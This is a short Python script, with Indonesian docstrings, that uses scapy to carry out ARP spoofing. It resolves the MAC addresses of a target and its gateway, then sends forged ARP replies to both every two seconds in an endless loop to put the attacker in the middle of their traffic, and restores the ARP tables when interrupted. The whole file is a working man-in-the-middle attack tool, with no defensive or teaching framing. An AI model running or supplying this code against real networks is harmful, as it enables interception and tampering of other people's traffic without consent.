import scapy.all as scapy
import time
import logging
import sys

log = logging.getLogger(__name__)

def get_mac(ip):
    """Mendapatkan MAC address dari IP menggunakan ARP request."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip, target_mac):
    """Mengirim ARP response palsu."""
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip, dest_mac, source_mac):
    """Mengembalikan tabel ARP ke kondisi semula."""
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc= source_mac)
    scapy.send(packet, count=4, verbose=False)

def attack(target_ip, gateway_ip, iface):
    """Melakukan ARP spoofing."""
    try:
        target_mac = get_mac(target_ip)
        if not target_mac:
            log.error(f"Could not get MAC address for target {target_ip}")
            sys.exit(1)
        gateway_mac = get_mac(gateway_ip)
        if not gateway_mac:
            log.error(f"Could not get MAC address for gateway {gateway_ip}")
            sys.exit(1)
        log.info(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")

        scapy.conf.iface = iface
        scapy.conf.verb = 0

        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)

    except KeyboardInterrupt:
        log.info("\nRestoring ARP tables...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        log.info("ARP tables restored. Exiting.")
    except Exception as e:
        log.exception(f"An unexpected error occurred: {e}")